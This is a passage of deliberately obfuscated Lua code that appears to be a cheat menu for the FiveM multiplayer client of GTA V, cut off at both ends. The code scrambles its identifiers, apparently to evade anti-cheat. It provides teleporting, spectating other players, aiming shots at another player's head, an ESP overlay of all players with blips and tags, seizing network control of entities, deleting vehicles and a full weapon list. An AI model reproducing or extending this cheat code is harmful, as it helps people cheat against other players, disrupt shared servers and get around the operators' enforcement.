	GTCHRRTSJHTYJT(HYTKULIUKUILU, "RTHNBRYJHYJYJT", GTRHRTJYULKYU)
end

function APISHITACCCCCCCCCCCCC.GRHRTJTRJKTYK(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "GTRRTGHRYHJRY", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].GTRRTGHRYHJRY.a})
end

function APISHITACCCCCCCCCCCCC.GTRJTRJRJYR(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(
		HYTKULIUKUILU,
		"RECGTERGETJYHETYTR",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].RECGTERGETJYHETYTR.a}
	)
end

function APISHITACCCCCCCCCCCCC.GTRHRTJYKUYLIUJJJJJJJJJJJ(HYTKULIUKUILU, FREERCRECGREGERTGCE, EWZXFSFERHWREWHTRH)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "VGRERHRFTGYHTHJY", {VRTHYJHYTJKTYKT = FREERCRECGREGERTGCE, HYTJNTYHJYT = EWZXFSFERHWREWHTRH})
end

function APISHITACCCCCCCCCCCCC.GTBRBYJNTYJYTJT(HYTKULIUKUILU, ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "GVTRHRTTRJRT", string.upper(ZXXXXXXXXXXXXXXXXXXXXXXXXZ))
end

function APISHITACCCCCCCCCCCCC.RFBTRNTRJYRTKMTYKTYKTY(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(
		HYTKULIUKUILU,
		"BTHTRJYUTKU",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].BTHTRJYUTKU.a}
	)
end

function APISHITACCCCCCCCCCCCC.GERHRTHTRHRTJTR(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "HYTHTYRFYHTYHFDR", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].HYTHTYRFYHTYHFDR.a})
end

function APISHITACCCCCCCCCCCCC.HHTRHBTRHRTH(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "GTRHRTJUYKYU", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].GTRHRTJUYKYU.a})
end

function APISHITACCCCCCCCCCCCC.VRTVDREXRGREXWHTVREVHERTVJ(HYTKULIUKUILU, r, g, b, a)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or VCREGREGVREVTECEW[HYTKULIUKUILU].menuFocusColor.a})
end

function APISHITACCCCCCCCCCCCC.GBRHRTHRTHRTHJ(HYTKULIUKUILU, HYTJNTYHJYT, RTEHTRHTRHRHYR)
	GTCHRRTSJHTYJT(HYTKULIUKUILU, "FREGRTHTRHR", {["HYTJNTYHJYT"] = HYTJNTYHJYT, ["RTEHTRHTRHRHYR"] = RTEHTRHTRHRHYR})
end

function VTRHTHRTJYTJYTKJT(GTRHTRJKYKUYJUYUYJYU, GHTRJRTKUKYUKYUKY, HRTJKTYKTHYTTHFYFD)
	AddTextEntry("FMMC_KEY_TIP1", GTRHTRJKYKUYJUYUYJYU .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", GHTRJRTKUKYUKYUKY, "", "", "", HRTJKTYKTHYTTHFYFD)
	TVRVRHTRHRTHJRTJRT = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local VGERVECCCCCCCC = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		TVRVRHTRHRTHJRTJRT = false
		return VGERVECCCCCCCC
	else
		Citizen.Wait(500)
		TVRVRHTRHRTHJRTJRT = false
		return nil
	end
end

local function vtrhyrtjyjytjtykjtk()
	local vtrvtrhrtrjytjyrfdtyjytytrf = {}
	for i = 0, GetNumberOfPlayers(128) do
		if NetworkIsPlayerActive(i) then
			vtrvtrhrtrjytjyrfdtyjytytrf[#vtrvtrhrtrjytjyrfdtyjytytrf + 1] = i
		end
	end
	return vtrvtrhrtrjytjyrfdtyjytytrf
end


function gvrtehtrhjtrjrted(x, y, z, ZXXXXXXXXXXXXXXXXXXXXXXXXZ, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.vrevtrhrthrthr(vregvtrvrttrbrjyjt, jytjtykytktyjhtyjhg)
	return tonumber(string.format("%." .. (jytjtykytktyjhtyjhg or 0) .. "f", vregvtrvrttrbrjyjt))
end

local function GREVGHEVHTHVRHR(RGTHTYHTRHWTE)
	local VGERVECCCCCCCC = {}
	local GTRGHRTGCRGTBRH = GetGameTimer() / 1000

	VGERVECCCCCCCC.r = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 0) * 127 + 128)
	VGERVECCCCCCCC.g = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 2) * 127 + 128)
	VGERVECCCCCCCC.b = math.floor(math.sin(GTRGHRTGCRGTBRH * RGTHTYHTRHWTE + 4) * 127 + 128)

	return VGERVECCCCCCCC
end

function AleTenAPIACJESTCHUJOWYSKRTR(ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(ZXXXXXXXXXXXXXXXXXXXXXXXXZ)
	DrawNotification(false, false)
end



local RHRTHJRTJRJKYTKTYU = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local BTBRTHJRJYHTJYRYTFY = true

local function vtrhntrhjyjyttyjeyt()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local vregthrthrtyjyutykuy = GetBlipInfoIdIterator(8)
		local vertegtrhthty = GetFirstBlipInfoId(8, vregthrthrtyjyutykuy)
		vredfsvgzregrthtrte = Citizen.InvokeNative(0xFA7C7F0AADF25D09, vertegtrhthty, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		vrerhtrtrerthtyhy = true
	else
		AleTenAPIACJESTCHUJOWYSKRTR("~r~No waypoint!")
	end

	local vrfrthrthjetyjtyj = 0.0
	RGHTVTHYYTJTYJ = 1000.0
	while true do
		Citizen.Wait(0)
		if vrerhtrtrerthtyhy then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				vrerghtrhrykkyukuykyDWE = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				vrerghtrhrykkyukuykyDWE = GetPlayerPed(-1)
			end

			SetEntityCoords(vrerghtrhrykkyukuykyDWE, vredfsvgzregrthtrte.x, vredfsvgzregrthtrte.y, RGHTVTHYYTJTYJ)
			FreezeEntityPosition(vrerghtrhrykkyukuykyDWE, true)
			local htretjetyytjyter = GetEntityCoords(vrerghtrhrykkyukuykyDWE, true)

			if vrfrthrthjetyjtyj == 0.0 then
				RGHTVTHYYTJTYJ = RGHTVTHYYTJTYJ - 25.0
				SetEntityCoords(vrerghtrhrykkyukuykyDWE, htretjetyytjyter.x, htretjetyytjyter.y, RGHTVTHYYTJTYJ)
				GEHTHRTHTRRTYJYRT, vrfrthrthjetyjtyj = GetGroundZFor_3dCoord(htretjetyytjyter.x, htretjetyytjyter.y, htretjetyytjyter.z, 0)
			else
				SetEntityCoords(vrerghtrhrykkyukuykyDWE, htretjetyytjyter.x, htretjetyytjyter.y, vrfrthrthjetyjtyj)
				FreezeEntityPosition(vrerghtrhrykkyukuykyDWE, false)
				vrerhtrtrerthtyhy = false
				RGHTVTHYYTJTYJ = 1000.0
				vrfrthrthjetyjtyj = 0.0
				AleTenAPIACJESTCHUJOWYSKRTR("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function regvrtetrjtyyt(egrthrthrehtyjyt, vrftghtkjyukykulyulky)
	if vrftghtkjyukykulyulky == nil then
		vrftghtkjyukykulyulky = "%s"
	end
	local fvregegtrheytjytt = {}
	i = 1
	for str in string.gmatch(egrthrthrehtyjyt, "([^" .. vrftghtkjyukykulyulky .. "]+)") do
		fvregegtrheytjytt[i] = str
		i = i + 1
	end
	return fvregegtrheytjytt
end

local errtjhtrjtyuyhjnur = false

function vrertntytmyjtyujkuykuykuy(vrerthbtrhtrjrtyjr)
	local hjytejyjtjjukjut = PlayerPedId()
	errtjhtrjtyuyhjnur = not errtjhtrjtyuyhjnur
	local gvrtrthbtrhtrhnry = GetPlayerPed(vrerthbtrhtrjrtyjr)

	if (errtjhtrjtyuyhjnur) then
		local vrfebtjyjytkytkyt, targetyrehtjhrjytjty, vrehbrtjntjrtjytkyt = table.unpack(GetEntityCoords(gvrtrthbtrhtrhnry, false))

		RequestCollisionAtCoord(vrfebtjyjytkytkyt, targetyrehtjhrjytjty, vrehbrtjntjrtjytkyt)
		NetworkSetInSpectatorMode(true, gvrtrthbtrhtrhnry)

		AleTenAPIACJESTCHUJOWYSKRTR("errtjhtrjtyuyhjnur " .. GetPlayerName(vrerthbtrhtrjrtyjr))
	else
		local vrfebtjyjytkytkyt, targetyrehtjhrjytjty, vrehbrtjntjrtjytkyt = table.unpack(GetEntityCoords(gvrtrthbtrhtrhnry, false))

		RequestCollisionAtCoord(vrfebtjyjytkytkyt, targetyrehtjhrjytjty, vrehbrtjntjrtjytkyt)
		NetworkSetInSpectatorMode(false, gvrtrthbtrhtrhnry)

		AleTenAPIACJESTCHUJOWYSKRTR("Stopped errtjhtrjtyuyhjnur " .. GetPlayerName(vrerthbtrhtrjrtyjr))
	end
end

function vrthrtjytjbbbbbbbbbbbbbbbbbbb(vrerthbtrhtrjrtyjr)
	local vrevregbrtsrsreewgrges = GetPedBoneCoords(vrerthbtrhtrjrtyjr, GetEntityBoneIndexByName(vrerthbtrhtrjrtyjr, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), vrevregbrtsrsreewgrges.x, vrevregbrtsrsreewgrges.y, vrevregbrtsrsreewgrges.z, true)
end

function vterhthrthtrh(RETHHTRTERHTREGHTYGHYT)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function vrtehtjtykjutkmtyf(RETHHTRTERHTREGHTYGHYT)
					 SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
					


					
end

function vrfehtrjyktykuykuyt(RETHHTRTERHTREGHTYGHYT)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function greghrtgrhrthjrtj(RETHHTRTERHTREGHTYGHYT)
	SetVehicleDirtLevel(RETHHTRTERHTREGHTYGHYT, 15.0)
end

function Cleanergrehgrehe(RETHHTRTERHTREGHTYGHYT)
	SetVehicleDirtLevel(RETHHTRTERHTREGHTYGHYT, 1.0)
end


vtrhtrjrtyjytjyt = {
	trhtyjkukuyluy = function(trhrtyyjttkytklu)
	  if trhrtyyjttkytklu.tuireokjghbtrjtrbjkgtrhnujktrhbugjr and trhrtyyjttkytklu.btghjytjkyutkuykyu then
		trhrtyyjttkytklu.tuireokjghbtrjtrbjkgtrhnujktrhbugjr(trhrtyyjttkytklu.btghjytjkyutkuykyu)
	  end
	  trhrtyyjttkytklu.tuireokjghbtrjtrbjkgtrhnujktrhbugjr = nil
	  trhrtyyjttkytklu.btghjytjkyutkuykyu = nil
	end
  }

function vthytrjytjtykyuyk(vthrtjykuyuylliul, tgjytkukuykuikuykg, htrujytjtktktytj)
	return coroutine.wrap(function()
	  local trhrtyjytjytjrtyyj, HYTKULIUKUILU = vthrtjykuyuylliul()
	  if not HYTKULIUKUILU or HYTKULIUKUILU == 0 then
		htrujytjtktktytj(trhrtyjytjytjrtyyj)
		return
	  end
	  
	  local trhrtyyjttkytklu = {btghjytjkyutkuykyu = trhrtyjytjytjrtyyj, tuireokjghbtrjtrbjkgtrhnujktrhbugjr = htrujytjtktktytj}
	  setmetatable(trhrtyyjttkytklu, vtrhtrjrtyjytjyt)
	  
	  local bthytjhyytjtyfyjt = true
	  repeat
		coroutine.yield(HYTKULIUKUILU)
		bthytjhyytjtyfyjt, HYTKULIUKUILU = tgjytkukuykuikuykg(trhrtyjytjytjrtyyj)
	  until not bthytjhyytjtyfyjt
	  
	  trhrtyyjttkytklu.tuireokjghbtrjtrbjkgtrhnujktrhbugjr, trhrtyyjttkytklu.btghjytjkyutkuykyu = nil, nil
	  htrujytjtktktytj(trhrtyjytjytjrtyyj)
	end)
  end

  function vtrhtrhjrtjrt()
	return vthytrjytjtykyuyk(htrjtyjytktty, dfeddddddddddd, EndFgrgreindObject)
  end

  function gtrhrtjr()
	return vthytrjytjtykyuyk(grgeeeeer, grgeeergr, greeeeeegrgr)
  end

  function grtgujiotrhjgkrtjhrtejui()
	return vthytrjytjtykyuyk(FindFirgrgrstVehicle, greeegrg, greeegrg)
  end

  function jytejyjytkjtykytkt()
	return vthytrjytjtykyuyk(greeeeeeergrg, grgreeeeeeeeeegrg, greeeeeeeeegr)
  end

function trfhrtyjytjytkytktkut(vrerghtrhrykkyukuykyDWE)
	local vtrgrthetsrtehhtrjeyjtr = 0
	NetworkRequestControlOfEntity(vrerghtrhrykkyukuykyDWE)
	while not NetworkHasControlOfEntity(vrerghtrhrykkyukuykyDWE) do
		vtrgrthetsrtehhtrjeyjtr = vtrgrthetsrtehhtrjeyjtr + 100
		Citizen.Wait(100)
		if vtrgrthetsrtehhtrjeyjtr > 5000 then
			AleTenAPIACJESTCHUJOWYSKRTR("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function weaewf3wewerewreh(vrerthbtrhtrjrtyjr)
	local VGERVECCCCCCCC, vrerghtrhrykkyukuykyDWE = GetEntityPlayerIsFreeAimingAt(vrerthbtrhtrjrtyjr, Citizen.ReturnResultAnyway())
	return vrerghtrhrykkyukuykyDWE
end

function btrhryjytyjktyktkuyku()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function vtrhrtjrtjrt(vtrhjrjykyuluyluy, rthrtstdrtrehtd)
	SetTextEntry_2("STRING")
	AddTextComponentString(vtrhjrjykyuluyluy)
	DrawSubtitleTimed(rthrtstdrtrehtd, 1)
end




ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local vtrhjtyjtyjtrjjdtyfhrytfdr = {}
	while true do
		Citizen.Wait(1)
		if rehrethrtjtjtyghdb then
		
			for HYTKULIUKUILU = 0, 128 do
				if NetworkIsPlayerActive(HYTKULIUKUILU) and GetPlayerPed(HYTKULIUKUILU) ~= GetPlayerPed(-1) then
					vrtdbrthjrjhjtrrted = GetPlayerPed(HYTKULIUKUILU)
					vertegtrhthty = GetBlipFromEntity(vrtdbrthjrjhjtrrted)

				
					
					vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU] = CreateMpGamerTag(vrtdbrthjrjhjtrrted, GetPlayerName( HYTKULIUKUILU ), false, false, "", false)
					vrevsrsewrewsrttrtr = GetPlayerWantedLevel(HYTKULIUKUILU)

					
					if vrevsrsewrewsrttrtr then
						SetMpGamerTagVisibility(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU], 7, true)
						SetMpGamerTagWantedLevel(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU], vrevsrsewrewsrttrtr)
					else
						SetMpGamerTagVisibility(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU], 7, false)
					end

				
					if vtrgrthtsredtrdetd(HYTKULIUKUILU) then
						SetMpGamerTagVisibility(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU], 9, true) 
					else
						SetMpGamerTagVisibility(vtrhjtyjtyjtrjjdtyfhrytfdr[HYTKULIUKUILU], 9, false)
					end

					

					if not DoesBlipExist(vertegtrhthty) then 
						vertegtrhthty = AddBlipForEntity(vrtdbrthjrjhjtrrted)
						SetBlipSprite(vertegtrhthty, 1)
						ShowHeadingIndicatorOnBlip(vertegtrhthty, true)
					else
						RETHHTRTERHTREGHTYGHYT = GetVehiclePedIsIn(vrtdbrthjrjhjtrrted, false)
						vhtrhtyvvvvvvvvvvvvvv = GetBlipSprite(vertegtrhthty)
						if not GetEntityHealth(vrtdbrthjrjhjtrrted) then
							if vhtrhtyvvvvvvvvvvvvvv ~= 274 then
								SetBlipSprite(vertegtrhthty, 274)
								ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
							end
						elseif RETHHTRTERHTREGHTYGHYT then
							vtrhrthtrhdttredhjtytjy = GetVehicleClass(RETHHTRTERHTREGHTYGHYT)
							vtrherthterhthrtgtgrhrtg = GetEntityModel(RETHHTRTERHTREGHTYGHYT)
							if vtrhrthtrhdttredhjtytjy == 15 then
								if vhtrhtyvvvvvvvvvvvvvv ~= 422 then
									SetBlipSprite(vertegtrhthty, 422)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrhrthtrhdttredhjtytjy == 8 then
								if vhtrhtyvvvvvvvvvvvvvv ~= 226 then
									SetBlipSprite(vertegtrhthty, 226)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrhrthtrhdttredhjtytjy == 16 then
								if vtrherthterhthrtgtgrhrtg == GetHashKey("besra") or vtrherthterhthrtgtgrhrtg == GetHashKey("hydra") or vtrherthterhthrtgtgrhrtg == GetHashKey("lazer") then
									if vhtrhtyvvvvvvvvvvvvvv ~= 424 then
										SetBlipSprite(vertegtrhthty, 424)
										ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
									end
								elseif vhtrhtyvvvvvvvvvvvvvv ~= 423 then
									SetBlipSprite(vertegtrhthty, 423)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
								end
							elseif vtrhrthtrhdttredhjtytjy == 14 then
								if vhtrhtyvvvvvvvvvvvvvv ~= 427 then
									SetBlipSprite(vertegtrhthty, 427)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("insurgent") or vtrherthterhthrtgtgrhrtg == GetHashKey("insurgent2") or vtrherthterhthrtgtgrhrtg == GetHashKey("insurgent3") then 
								if vhtrhtyvvvvvvvvvvvvvv ~= 426 then
									SetBlipSprite(vertegtrhthty, 426)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("limo2") then
								if vhtrhtyvvvvvvvvvvvvvv ~= 460 then
									SetBlipSprite(vertegtrhthty, 460)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("rhino") then
								if vhtrhtyvvvvvvvvvvvvvv ~= 421 then
									SetBlipSprite(vertegtrhthty, 421)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("trash") or vtrherthterhthrtgtgrhrtg == GetHashKey("trash2") then
								if vhtrhtyvvvvvvvvvvvvvv ~= 318 then
									SetBlipSprite(vertegtrhthty, 318)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false)
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("pbus") then 
								if vhtrhtyvvvvvvvvvvvvvv ~= 513 then
									SetBlipSprite(vertegtrhthty, 513)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("seashark") or vtrherthterhthrtgtgrhrtg == GetHashKey("seashark2") or vtrherthterhthrtgtgrhrtg == GetHashKey("seashark3") then
								if vhtrhtyvvvvvvvvvvvvvv ~= 471 then
									SetBlipSprite(vertegtrhthty, 471)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
							elseif vtrherthterhthrtgtgrhrtg == GetHashKey("cargobob") or vtrherthterhthrtgtgrhrtg == GetHashKey("cargobob2") or vtrherthterhthrtgtgrhrtg == GetHashKey("cargobob3") or vtrherthterhthrtgtgrhrtg == GetHashKey("cargobob4") then -- Cargobobs
								if vhtrhtyvvvvvvvvvvvvvv ~= 481 then
									SetBlipSprite(vertegtrhthty, 481)
									ShowHeadingIndicatorOnBlip(vertegtrhthty, false) 
								end
